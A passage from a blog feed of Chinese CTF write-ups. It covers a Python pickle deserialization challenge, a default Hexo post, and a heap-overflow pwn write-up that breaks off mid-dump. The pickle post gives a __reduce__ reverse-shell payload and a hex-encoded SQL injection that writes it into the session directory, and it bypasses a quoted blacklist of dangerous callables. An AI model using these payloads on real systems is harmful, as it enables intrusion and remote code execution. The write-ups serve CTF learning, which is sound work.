class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Unpickler <span class="keyword">as</span> Unpkler</span><br><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">black_type_list = [eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen,</span><br><span class="line">                   tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link,</span><br><span class="line">                   lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs,</span><br><span class="line">                   rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv,</span><br><span class="line">                   execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe,</span><br><span class="line">                   spawnv, spawnve, spawnvp, spawnvpe, load, loads]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FilterException</span><span class="params">(Exception)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        super(FilterException, self).__init__(</span><br><span class="line">            <span class="string">'the callable object &#123;value&#125; is not allowed'</span>.format(value=str(value)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_call</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> args[<span class="number">0</span>].stack</span><br><span class="line">        <span class="keyword">if</span> args[<span class="number">0</span>].stack[<span class="number">-2</span>] <span class="keyword">in</span> black_type_list:</span><br><span class="line">            <span class="keyword">raise</span> FilterException(args[<span class="number">0</span>].stack[<span class="number">-2</span>])</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(file)</span>:</span></span><br><span class="line">    unpkler = Unpkler(file)</span><br><span class="line">    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])</span><br><span class="line">    <span class="keyword">return</span> Unpkler(file).load()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(str)</span>:</span></span><br><span class="line">    file = StringIO(str)</span><br><span class="line">    unpkler = Unpkler(file)</span><br><span class="line">    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])</span><br><span class="line">    <span class="keyword">return</span> unpkler.load()</span><br></pre></td></tr></table></figure></p><p>这里存在反序列化漏洞以及基本的沙箱逃逸问题。</p><h3 id="pickle序列化"><a href="#pickle序列化" class="headerlink" title="pickle序列化"></a>pickle序列化</h3><p>Python提供两个模块来实现序列化：<code>cPickle</code>和<code>pickle</code>。这两个模块功能是一样的，区别在于<code>cPickle</code>是C语言写的，速度快，<code>pickle</code>是纯Python写的，速度慢。</p><p><code>pickle</code>模块提供的相关函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将指定的Python对象通过pickle序列化作为bytes对象返回，而不是将其写入文件</span></span><br><span class="line">dumps(obj, protocol=<span class="keyword">None</span>, *, fix_imports=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将通过pickle序列化后得到的字节对象进行反序列化，转换为Python对象并返回</span></span><br><span class="line">loads(bytes_object, *, fix_imports=<span class="keyword">True</span>, encoding=<span class="string">"ASCII"</span>, errors=<span class="string">"strict"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将指定的Python对象通过pickle序列化后写入打开的文件对象中，等价于`Pickler(file, protocol).dump(obj)`</span></span><br><span class="line">dump(obj, file, protocol=<span class="keyword">None</span>, *, fix_imports=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从打开的文件对象中读取pickled对象表现形式并返回通过pickle反序列化后得到的Python对象</span></span><br><span class="line">load(file, *, fix_imports=<span class="keyword">True</span>, encoding=<span class="string">"ASCII"</span>, errors=<span class="string">"strict"</span>)</span><br></pre></td></tr></table></figure></p><blockquote><p>说明： 上面这几个方法参数中，*号后面的参数都是Python 3.x新增的，目的是为了兼容Python 2.x，具体用法请参看官方文档。</p></blockquote><p>基本使用方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">P = pickle.Pickler(file) <span class="comment">#pickle.dump(object, file)</span></span><br><span class="line">P.dump(object)</span><br><span class="line"></span><br><span class="line">U = pickle.Unpickler(file) <span class="comment">#pickle.load(file)</span></span><br><span class="line">object = U.load()</span><br></pre></td></tr></table></figure></p><h3 id="pickle反序列化漏洞"><a href="#pickle反序列化漏洞" class="headerlink" title="pickle反序列化漏洞"></a>pickle反序列化漏洞</h3><p>python的反序列化漏洞关键在于<strong>reduce</strong> 魔术方法，在反序列化的时候会完全改变被序列化的对象。这个方法返回一个字符串或者元组来描述当反序列化的时候该如何重构，进而造成命令执行。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">"id"</span>,))    </span><br><span class="line"></span><br><span class="line">t = test()</span><br><span class="line"></span><br><span class="line">f1 = open(<span class="string">'p_test'</span>,<span class="string">'wb'</span>)</span><br><span class="line">p = pickle.Pickler(f1)</span><br><span class="line">p.dump(t) <span class="comment">#p = pickle.dump(t, f1)</span></span><br><span class="line">f1.close()</span><br><span class="line"></span><br><span class="line">f2 = open(<span class="string">'p_test'</span>,<span class="string">'rb'</span>)</span><br><span class="line">u = pickle.Unpickler(f2)</span><br><span class="line">u.load() <span class="comment">#u = pickle.load(f2)</span></span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure></p><p>运行效果：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kira @ Ubuntu <span class="keyword">in</span> ~/py_web [11:24:46]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python p_test.py</span></span><br><span class="line">uid=1000(kira) gid=1000(kira) groups=1000(kira),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lxd),115(lpadmin),116(sambashare)</span><br></pre></td></tr></table></figure></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>现在重新看看<code>load(file)</code>和<code>loads(str)</code>两个函数，是带有过滤的反序列化，一个用于操作文件，一个用于操作字符串。</p><p>搜索一下，看看代码里面哪里用到这个两个函数，发现在<code>Mycache.py</code>有这个类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class FileSystemCache(BaseCache)</span><br></pre></td></tr></table></figure></p><p>而用到这个类的代码都在<code>Mysession.py</code>这个类，都是对session操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class FileSystemSessionInterface(SessionInterface)</span><br></pre></td></tr></table></figure></p><p>重点留意下<code>open_session()</code>和<code>save_session()</code>，这是反序列化常见套路。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_session</span><span class="params">(self, app, request)</span>:</span></span><br><span class="line">    sid = request.cookies.get(app.session_cookie_name)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sid:</span><br><span class="line">        sid = self._generate_sid()</span><br><span class="line">        <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</span><br><span class="line">    <span class="keyword">if</span> self.use_signer:</span><br><span class="line">        signer = self._get_signer(app)</span><br><span class="line">        <span class="keyword">if</span> signer <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sid_as_bytes = signer.unsign(sid)</span><br><span class="line">            sid = sid_as_bytes.decode()</span><br><span class="line">        <span class="keyword">except</span> BadSignature:</span><br><span class="line">            sid = self._generate_sid()</span><br><span class="line">            <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</span><br><span class="line">    data = self.cache.get(self.key_prefix + sid)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> self.session_class(data, sid=sid)</span><br><span class="line">    <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</span><br></pre></td></tr></table></figure></p><p>留意<code>open_session()</code>中调用了<code>self.cache.get(self.key_prefix + sid)</code>，跟进之<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, key)</span>:</span> <span class="comment"># key = self.key_prefix + sid</span></span><br><span class="line">    filename = self._get_filename(key)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pickle_time = load(f) <span class="comment">#可能存在反序列化</span></span><br><span class="line">            <span class="keyword">if</span> pickle_time == <span class="number">0</span> <span class="keyword">or</span> pickle_time &gt;= time():</span><br><span class="line">                a = load(f) <span class="comment">#可能存在反序列化</span></span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                os.remove(filename)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">except</span> (IOError, OSError, PickleError):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br></pre></td></tr></table></figure></p><p><code>get</code>中两处地方出现<code>load()</code>，十分可疑。<code>filename = self._get_filename(key)</code>跟进之。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_filename</span><span class="params">(self, key)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(key, text_type):</span><br><span class="line">        key = key.encode(<span class="string">'utf-8'</span>)  <span class="comment"># XXX unicode review</span></span><br><span class="line">    hash = md5(key).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> os.path.join(self._path, hash)</span><br></pre></td></tr></table></figure></p><p>可见<code>filename</code>就是<code>md5(self.key_prefix + sid)</code>，查看代码可发现：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key_prefix=<span class="string">"bdwsessions"</span></span><br><span class="line">sid = request.cookies.get(app.session_cookie_name)</span><br></pre></td></tr></table></figure></p><p>查看页面的cookie：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sid = ca823fed-c8b9-450c-8ec9-fc7626ce8326</span><br><span class="line">md5(&quot;bdwsessionsca823fed-c8b9-450c-8ec9-fc7626ce8326&quot;) = 7d6e204846c11a84ab0bc317eab14411</span><br></pre></td></tr></table></figure></p><p>session存在目录在<code>config.py</code>中就记录，本地验证一下，果然存在。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kira @ Ubuntu <span class="keyword">in</span> ~ [14:24:00] C:1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ll /tmp/ffff |grep 7d6e204846c11a84ab0bc317eab14411</span></span><br><span class="line">-rw-rw---- 1 kira kira 254 Apr 15 14:19 7d6e204846c11a84ab0bc317eab14411</span><br></pre></td></tr></table></figure></p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ol><li>本地生成序列化session文件</li><li>跟进session文件名规则计算出文件名</li><li>利用mysql的注入，将文件写入/tmp/ffff目录</li><li>访问index的时，修改自己的session为之前我们定义的值</li><li>触发<code>open_session</code>中的<code>self.cache.get</code>，进行反序列化攻击</li></ol><p>源码还设置了沙箱/黑名单来防止某些函数的执行，首先需要绕过黑名单，观察一下，还有以下不在黑名单中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subprocess.Popen</span><br><span class="line">subprocess.call</span><br><span class="line">commands</span><br></pre></td></tr></table></figure></p><p>本地监听端口，测试反弹shell<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (commands.getoutput,(<span class="string">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",9394));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span>,)) </span><br><span class="line"></span><br><span class="line">t = test()</span><br><span class="line"></span><br><span class="line">f1 = open(<span class="string">'p_test'</span>,<span class="string">'wb'</span>)</span><br><span class="line">p = pickle.Pickler(f1)</span><br><span class="line">p.dump(t) <span class="comment">#p = pickle.dump(t, f1)</span></span><br><span class="line">f1.close()</span><br><span class="line"></span><br><span class="line">f2 = open(<span class="string">'p_test'</span>,<span class="string">'rb'</span>)</span><br><span class="line">u = pickle.Unpickler(f2)</span><br><span class="line">u.load() <span class="comment">#u = pickle.load(f2)</span></span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure></p><p>为了后续注入，将session内容进行hex编码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f2 = open(<span class="string">'p_test'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="keyword">print</span> f2.read().encode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></p><p>新的session文件随便修改一下之前的sid<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(&quot;bdwsessionsca823fed-c8b9-450c-8ec9-fc7626ceffff&quot;) = d9e836cec5ab2c715fd4050fdc26bd4b</span><br></pre></td></tr></table></figure></p><p>注入点就用上面提到Email的注入点，构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from user where email = &apos;123&apos;/**/union/**/select/**/0x63636f6d6d616e64730a6765746f75747075740a70300a285327707974686f6e202d63205c27696d706f727420736f636b65742c73756270726f636573732c6f733b733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b732e636f6e6e6563742828223132372e302e302e31222c3933393429293b6f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b703d73756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d293b5c27270a70310a7470320a5270330a2e/**/into/**/dumpfile/**/&apos;/tmp/ffff/d9e836cec5ab2c715fd4050fdc26bd4b&apos;#@qq.com&apos;</span><br></pre></td></tr></table></figure></p><p>邮箱地址填入以上payload，点击submit后出现<code>Please use a different email address.</code>即可。</p><p>接着在burp中抓取访问index的包，并修改session为<code>ca823fed-c8b9-450c-8ec9-fc7626ceffff</code>，在自己的vps上监听对应的端口。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文纯属抄袭，如有改动，纯属手残。&lt;/p&gt;
&lt;p&gt;原writeup见：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://skysec.top/2018/04/01/Python-is-the-best-language/#%E6%BA%90%E7%A0%81%E7%BB%93
      
    
    </summary>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2018/04/16/hello-world/"/>
    <id>http://yoursite.com/2018/04/16/hello-world/</id>
    <published>2018-04-16T03:27:50.017Z</published>
    <updated>2018-01-16T11:10:53.418Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>qwb-pwn-opm</title>
    <link href="http://yoursite.com/2018/04/12/qwb-pwn-opm/"/>
    <id>http://yoursite.com/2018/04/12/qwb-pwn-opm/</id>
    <published>2018-04-12T08:33:24.000Z</published>
    <updated>2018-04-12T08:35:00.146Z</updated>
    
    <content type="html"><![CDATA[<h3 id="opm"><a href="#opm" class="headerlink" title="opm"></a>opm</h3><p>首先学习一下在IDA创建结构体，<a href="https://blog.csdn.net/hgy413/article/details/7104304" target="_blank" rel="noopener">https://blog.csdn.net/hgy413/article/details/7104304</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000000 role            struc ; (sizeof=0x20, mappedto_6)</span><br><span class="line">00000000 func            dq ?</span><br><span class="line">00000008 name            dq ?</span><br><span class="line">00000010 length          dq ?</span><br><span class="line">00000018 punch_num       dq ?</span><br><span class="line">00000020 role            ends</span><br></pre></td></tr></table></figure><p>按y重新设置类型后，add_role()伪代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">role *<span class="title">add_role</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  role *v0; <span class="comment">// rbx</span></span><br><span class="line">  role *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  role *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-1A0h]</span></span><br><span class="line">  role *v6; <span class="comment">// [rsp+80h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [rsp+100h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+188h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = (role *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  sub_56544D04DE2C((__int64)v0);                <span class="comment">// 初始化结构体</span></span><br><span class="line">  v6 = v0;</span><br><span class="line">  v0-&gt;func = (__int64)show;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your name:"</span>);</span><br><span class="line">  gets(&amp;s);                                     <span class="comment">// 溢出点</span></span><br><span class="line">  v1 = v6;</span><br><span class="line">  v1-&gt;length = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v7 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, &amp;s);</span><br><span class="line">  v6-&gt;name = (__int64)v7;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"N punch?"</span>);</span><br><span class="line">  gets(&amp;s);                                     <span class="comment">// 溢出点</span></span><br><span class="line">  v3 = v6;</span><br><span class="line">  LODWORD(v3-&gt;punch_num) = atoi(&amp;s);</span><br><span class="line">  show((__int64)v6);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路：gets可以覆盖v6（注意gets会在末位加上’\x00’），第一个溢出点可以改变结构体存放的地址，第二溢出点可以用于泄露地址。</p><p><strong>具体利用过程</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'A'</span>*<span class="number">0x70</span>,<span class="number">1</span>)  <span class="comment">#padding</span></span><br><span class="line">add(<span class="string">'B'</span>*<span class="number">0x80</span>+<span class="string">"\x10"</span>,<span class="number">2</span>) <span class="comment">#role1</span></span><br><span class="line">add(<span class="string">'C'</span>*<span class="number">0x80</span>,<span class="string">'3'</span>+<span class="string">'D'</span>*<span class="number">0x7f</span>+<span class="string">'\x10'</span>) <span class="comment">#role2</span></span><br></pre></td></tr></table></figure><p>程序在heap上会有个很大的chunk，所以覆盖v6的最低位，或者倒数第二为\x00，指针仍然在heap上。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x5603fb8e5000</span><br><span class="line">0x5603fb8e5000:0x00000000000000000x0000000000011c11</span><br><span class="line">0x5603fb8e5010:0x0000000000011c000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>首先正常创建一个role0（用来调整堆的位置，让role1-&gt;name在可控范围范围内）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x55877d5ee000+0x11c10</span><br><span class="line">0x55877d5ffc10:0x00000000000000000x0000000000000031</span><br><span class="line">0x55877d5ffc20:0x000055877c368b30-&gt;func0x000055877d5ffc50-&gt;name</span><br><span class="line">0x55877d5ffc30:0x0000000000000070-&gt;len 0x0000000000000001-&gt;punch</span><br><span class="line">0x55877d5ffc40:0x00000000000000000x0000000000000081</span><br><span class="line">0x55877d5ffc50:0x41414141414141410x4141414141414141-&gt;存放name的chunk</span><br><span class="line">0x55877d5ffc60:0x41414141414141410x4141414141414141</span><br></pre></td></tr></table></figure></p><p>然后创建一个role1，输入name的时候v6被覆盖成<code>xxxx0010</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4gx 0x55877c56a0e0</span><br><span class="line">0x55877c56a0e0:0x000055877d5ffc20-&gt;role00x000055877d5f0010-&gt;role1</span><br><span class="line">0x55877c56a0f0:0x000055877d5f0010-&gt;role20x0000000000000000</span><br></pre></td></tr></table></figure><p>由于v6被覆盖，只有func存到正确位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffcc0:0x00000000000000000x0000000000000031</span><br><span class="line">0x55877d5ffcd0:0x000055877c368b30-&gt;func0x0000000000000000</span><br><span class="line">0x55877d5ffce0:0x0000000000000000        0x0000000000000000</span><br><span class="line">0x55877d5ffcf0:0x00000000000000000x0000000000000091</span><br><span class="line">0x55877d5ffd00:0x42424242424242420x4242424242424242-&gt;存放name的chunk</span><br><span class="line">0x55877d5ffd10:0x42424242424242420x4242424242424242</span><br></pre></td></tr></table></figure></p><p>其余部分存放到<code>0x000055877d5f0010</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 